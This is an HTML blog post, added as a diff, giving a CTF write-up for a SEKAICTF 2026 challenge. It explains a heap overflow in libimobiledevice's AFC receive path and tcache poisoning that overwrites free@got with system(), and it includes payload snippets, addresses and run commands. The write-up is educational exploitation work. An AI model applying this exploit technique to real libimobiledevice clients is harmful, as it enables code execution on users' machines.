@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SEKAICTF 2026 - AFC 0day Challenge ~ davi-1337</title>
+  <link rel="icon" type="image/jpeg" href="../assets/images.jpeg">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #0a0a0a;
+      color: #b0b0b0;
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 15px;
+      line-height: 1.7;
+      min-height: 100vh;
+      padding: 20px;
+      max-width: 760px;
+      margin: 0 auto;
+    }
+
+    ::selection { background: #00ff41; color: #0a0a0a; }
+    a { color: #00ff41; text-decoration: none; }
+    a:hover { color: #fff; }
+    .g { color: #00ff41; }
+
+    nav {
+      padding: 10px 0;
+      margin-bottom: 25px;
+      border-bottom: 1px solid #1a1a1a;
+      font-size: 13px;
+    }
+
+    nav a { margin-right: 20px; color: #666; }
+    nav a:hover { color: #00ff41; }
+
+    .post-header {
+      margin-bottom: 30px;
+      border-bottom: 1px solid #1a1a1a;
+      padding-bottom: 15px;
+    }
+
+    .post-header h1 {
+      color: #00ff41;
+      font-size: 18px;
+      font-weight: normal;
+      margin-bottom: 8px;
+    }
+
+    .post-meta { color: #444; font-size: 12px; }
+
+    .post-content h2 {
+      color: #00ff41;
+      font-size: 16px;
+      font-weight: normal;
+      margin: 25px 0 10px 0;
+    }
+
+    .post-content p { margin-bottom: 12px; }
+    .post-content ul { margin: 10px 0 10px 20px; }
+    .post-content ol { margin: 10px 0 10px 25px; }
+    .post-content li { margin-bottom: 5px; }
+
+    .post-content code {
+      color: #00ff41;
+      background: #111;
+      padding: 1px 4px;
+    }
+
+    .post-content pre {
+      background: #111;
+      border: 1px solid #1a1a1a;
+      padding: 12px;
+      overflow-x: auto;
+      margin: 15px 0;
+    }
+
+    .post-content pre code {
+      background: transparent;
+      padding: 0;
+      color: #b0b0b0;
+    }
+
+    footer {
+      margin-top: 40px;
+      padding-top: 15px;
+      border-top: 1px solid #1a1a1a;
+      color: #333;
+      font-size: 12px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <nav>
+    <a href="../index.html"><span class="g">[~]</span> home</a>
+    <a href="../about.html"><span class="g">[~]</span> about</a>
+  </nav>
+
+  <div class="post-header">
+    <h1>&gt; SEKAICTF 2026 - AFC 0day Challenge</h1>
+    <p class="post-meta">2026-07-01 // davi-1337 // ctf writeup</p>
+  </div>
+
+  <div class="post-content">
+    <h2>Summary</h2>
+    <p>The challenge gives us an AFC client (<code>afc_list</code>) that expects to talk to an Apple device. In this service, the remote peer controls the "device" side of the protocol. That is the key idea: the vulnerable binary is the client, but we fully control every AFC response it receives.</p>
+    <p>The bug is in <code>libimobiledevice</code>'s AFC receive path. An AFC packet has two length fields, <code>entire_length</code> and <code>this_length</code>. The library allocates a heap buffer from <code>entire_length - 0x28</code>, but it reads <code>this_length - 0x28</code> bytes into that buffer. If we reply with <code>this_length &gt; entire_length</code>, we get a controlled heap overflow.</p>
+    <p>The target runs glibc 2.31, where tcache does not use safe-linking yet. The main binary is No PIE and Partial RELRO, so the PLT GOT is writable and located at fixed addresses. The exploit uses tcache poisoning to make a small <code>strdup()</code> write the address of <code>system()</code> into <code>free@got</code>. After that, the program's normal cleanup calls <code>free(ptr)</code>, which has become <code>system(ptr)</code>, executing:</p>
+    <pre><code>/readflag sekai ppp</code></pre>
+
+    <h2>Relevant files</h2>
+    <ul>
+      <li><code>src/afc_list.c</code>: interactive wrapper around the real <code>libimobiledevice</code> AFC API.</li>
+      <li><code>afc_list</code>: main challenge binary, compiled without PIE.</li>
+      <li><code>libc.so.6</code>: provided glibc 2.31.</li>
+      <li><code>Dockerfile</code>: builds the Ubuntu 20.04 environment and installs <code>readflag</code>.</li>
+      <li><code>hook.sh</code>: changes the nsjail configuration to allow SUID and disable ASLR.</li>
+      <li><code>xpl1.py</code>: final exploit.</li>
+    </ul>
+
+    <h2>Mitigations</h2>
+    <p><code>checksec</code> on <code>afc_list</code>:</p>
+    <pre><code>Arch:       amd64
+RELRO:      Partial RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+SHSTK:      Enabled
+IBT:        Enabled</code></pre>
+    <p>The important points are:</p>
+    <ul>
+      <li><code>Partial RELRO</code>: <code>.got.plt</code> remains writable.</li>
+      <li><code>No PIE</code>: addresses such as <code>free@got</code> are fixed.</li>
+    </ul>
+    <p>The jail hook is also critical:</p>
+    <pre><code>persona_addr_no_randomize: true
+disable_no_new_privs: true
+nosuid:false</code></pre>
+    <p>This makes the memory layout deterministic and allows the SUID <code>/readflag</code> helper to work.</p>
+
+    <h2>AFC packet format</h2>
+    <p>Every AFC packet starts with a 0x28-byte header:</p>
+    <pre><code>typedef struct {
+    char     magic[8];       // "CFA6LPAA"
+    uint64_t entire_length;
+    uint64_t this_length;
+    uint64_t packet_num;
+    uint64_t operation;
+} AFCPacket;</code></pre>
+    <p>The service exposes a simple text interface:</p>
+    <pre><code>ls &lt;path&gt;
+read &lt;path&gt;
+write &lt;path&gt; &lt;data&gt;
+...</code></pre>
+    <p>Internally, those commands call <code>libimobiledevice</code> functions:</p>
+    <pre><code>afc_read_directory(afc, path, &amp;list);
+afc_file_open(afc, path, AFC_FOPEN_RDONLY, &amp;h);
+afc_file_read(afc, h, data, sizeof(data), &amp;got);</code></pre>
+    <p>Those functions send AFC requests to the device. Since we are the device, our exploit receives each request and sends arbitrary AFC responses back.</p>
+
+    <h2>The vulnerability</h2>
+    <p>The internal AFC receive logic effectively behaves like this:</p>
+    <pre><code>body_size_alloc = header.entire_length - 0x28;
+body_size_read  = header.this_length   - 0x28;
+
+buf = malloc(body_size_alloc);
+service_receive(conn, buf, body_size_read);</code></pre>
+    <p>If we send:</p>
+    <pre><code>entire_length = 0x28 + 8
+this_length   = 0x28 + 0x28</code></pre>
+    <p>the library allocates 8 bytes but reads 0x28 bytes. On glibc, <code>malloc(8)</code> returns a 0x20-sized chunk. Writing 0x28 bytes from the user pointer lets us overwrite metadata and the <code>fd</code> pointer of the next chunk.</p>
+    <p>The core primitive is:</p>
+    <pre><code>poison = b"P" * 0x18
+poison += p64(0x21)       # keep the next chunk as a valid 0x20 chunk
+poison += p64(FREE_GOT)   # poisoned fd</code></pre>
+
+    <h2>Why tcache poisoning works</h2>
+    <p>The challenge uses Ubuntu glibc 2.31. In this version, tcache stores raw forward pointers; safe-linking was not added yet. Therefore, if a tcache bin contains:</p>
+    <pre><code>A -&gt; B -&gt; C</code></pre>
+    <p>and we overwrite <code>B-&gt;fd = free@got</code>, future allocations behave as:</p>
+    <pre><code>A -&gt; B -&gt; free@got</code></pre>
+    <p>After enough small allocations, <code>malloc()</code> or <code>strdup()</code> can return a pointer directly into <code>free@got</code>. When that happens, the copy performed by <code>strdup()</code> becomes a GOT write.</p>
+
+    <h2>Initial grooming</h2>
+    <p>The exploit starts with a controlled <code>ls /</code> response:</p>
+    <pre><code>groom = b"A" * 8 + b"\x00" + b"B" * 8 + b"\x00" + b"C" * 8
+self.ls_response(groom)</code></pre>
+    <p>This creates two visible directory entries:</p>
+    <pre><code>AAAAAAAA
+BBBBBBBB</code></pre>
+    <p>The important part is the heap side effect:</p>
+    <ul>
+      <li>the raw AFC data buffer is small and lands in a 0x30 chunk;</li>
+      <li>the parsed pointer vector lands in a 0x20 chunk;</li>
+      <li>each <code>strdup()</code> of the two entries also lands in a 0x20 chunk;</li>
+      <li><code>free_list()</code> then frees everything in reverse order.</li>
+    </ul>
+    <p>After this grooming step, tcache's 0x20 bin contains 3 predictable chunks. We need exactly this shape because the final trigger will consume:</p>
+    <ol>
+      <li>one chunk for the list pointer vector;</li>
+      <li>one chunk for <code>strdup("/readflag sekai ppp")</code>;</li>
+      <li>the poisoned allocation that returns <code>free@got</code>.</li>
+    </ol>
+
+    <h2>Poisoning tcache</h2>
+    <p>The exploit uses the command <code>read /x</code> to reach <code>afc_file_read()</code>.</p>
+    <p>First, it answers <code>afc_file_open()</code> with a fake file handle:</p>
+    <pre><code>self.respond(packet, p64(1), op=OP_FILE_OPEN_RES)</code></pre>
+    <p>Then it answers <code>afc_file_read()</code> with the malformed packet:</p>
+    <pre><code>poison = b"P" * 0x18 + p64(0x21) + p64(FREE_GOT)
+self.respond(packet, poison, entire=0x28 + 8, this=0x28 + len(poison))</code></pre>
+    <p>The effect is:</p>
+    <ul>
+      <li><code>malloc(8)</code> takes the first 0x20 tcache chunk;</li>
+      <li>the overflow reaches the next free chunk;</li>
+      <li>that next chunk's <code>fd</code> becomes <code>0x404070</code>, which is <code>free@got</code>;</li>
+      <li>when the read buffer is freed, it is pushed back at the head of tcache.</li>
+    </ul>
+    <p>Conceptually:</p>
+    <pre><code>tcache[0x20] = A -&gt; B -&gt; free@got</code></pre>
+
+    <h2>Overwriting free@got</h2>
+    <p>The target address is:</p>
+    <pre><code>free@got = 0x404070</code></pre>
+    <p>The <code>system()</code> address in the local jail is fixed because ASLR is disabled:</p>
+    <pre><code>libc base = 0x7ffff7d65000
+system    = libc base + 0x52290
+system    = 0x7ffff7db7290</code></pre>
+    <p>The final payload is another <code>ls /</code> response:</p>
+    <pre><code>payload = b"/readflag sekai ppp\x00"
+payload += p64(SYSTEM)[:6] + b"\x00"</code></pre>
+    <p>Why only 6 bytes of the pointer? In x86-64 userspace, the top two bytes of this canonical address are zero. Writing 6 bytes plus the NUL terminator is enough to form the correct pointer, while avoiding extra NUL bytes that would create unwanted list entries.</p>
+    <p>During final list parsing:</p>
+    <ol>
+      <li>the pointer vector consumes <code>A</code>;</li>
+      <li><code>strdup("/readflag sekai ppp")</code> consumes <code>B</code>;</li>
+      <li><code>strdup(system_bytes)</code> returns <code>free@got</code>;</li>
+      <li><code>strdup()</code> copies the <code>system()</code> bytes into <code>free@got</code>.</li>
+    </ol>
+    <p>At this point:</p>
+    <pre><code>free(ptr) == system(ptr)</code></pre>
+
+    <h2>Execution trigger</h2>
+    <p>The program triggers code execution by itself.</p>
+    <p>After printing a directory listing, <code>afc_list</code> cleans it up:</p>
+    <pre><code>static void free_list(char **list, int n)
+{
+    for (int i = n - 1; i &gt;= 0; i--) free(list[i]);
+    free(list);
+}</code></pre>
+    <p>Since <code>free@got</code> now points to <code>system()</code>, this becomes:</p>
+    <pre><code>system(list[i]);</code></pre>
+    <p>The reverse free order causes a few invalid shell commands before/after the useful one. That does not matter. The important call is:</p>
+    <pre><code>system("/readflag sekai ppp")</code></pre>
+    <p>The output looks like this:</p>
+    <pre><code>/readflag sekai ppp
+&lt;system pointer bytes&gt;
+sh: 1: &lt;garbage&gt;: not found
+SEKAI{REDACTED}
+sh: 1: &lt;garbage&gt;: not found
+afc&gt;</code></pre>
+    <p>The exploit extracts the flag with:</p>
+    <pre><code>rb"SEKAI\{[^}\n]*\}"</code></pre>
+
+    <h2>Full exploit flow</h2>
+    <ol>
+      <li>Connect to the service.</li>
+      <li>Wait for the <code>afc&gt; </code> prompt.</li>
+      <li>Send <code>ls /</code> to prepare 0x20 tcache chunks.</li>
+      <li>Send <code>read /x</code>.</li>
+      <li>Reply to <code>afc_file_open()</code> with a fake handle.</li>
+      <li>Reply to <code>afc_file_read()</code> with <code>entire_length &lt; this_length</code> to overflow.</li>
+      <li>Overwrite the <code>fd</code> of a free chunk with <code>free@got</code>.</li>
+      <li>Complete the read command with an empty AFC response.</li>
+      <li>Send the final <code>ls /</code>.</li>
+      <li>Make <code>strdup()</code> write <code>system()</code> into <code>free@got</code>.</li>
+      <li>Let <code>free_list()</code> execute <code>/readflag sekai ppp</code>.</li>
+      <li>Parse the flag from stdout.</li>
+    </ol>
+
+    <h2>Running it</h2>
+    <p>Local:</p>
+    <pre><code>./xpl1.py local</code></pre>
+    <p>Remote:</p>
+    <pre><code>./xpl1.py remote HOST PORT</code></pre>
+    <p>The local mode uses:</p>
+    <pre><code>127.0.0.1:5000</code></pre>
+
+    <h2>Final notes</h2>
+    <p>The exploit relies on three environment properties:</p>
+    <ul>
+      <li>glibc 2.31 without safe-linking;</li>
+      <li>ASLR disabled by the nsjail hook;</li>
+      <li>writable <code>.got.plt</code> due to Partial RELRO.</li>
+    </ul>
+    <p>Without disabled ASLR, we would need a libc leak before writing <code>system()</code>. With Full RELRO, the GOT overwrite route would not work. With safe-linking, the tcache poisoning would need the correct pointer encoding or a separate heap leak.</p>
+  </div>
+
+  <footer>
+    <p><a href="../index.html">&lt;- home</a> // davi-1337 &copy; 2026</p>
+  </footer>
+
+</body>
+</html>
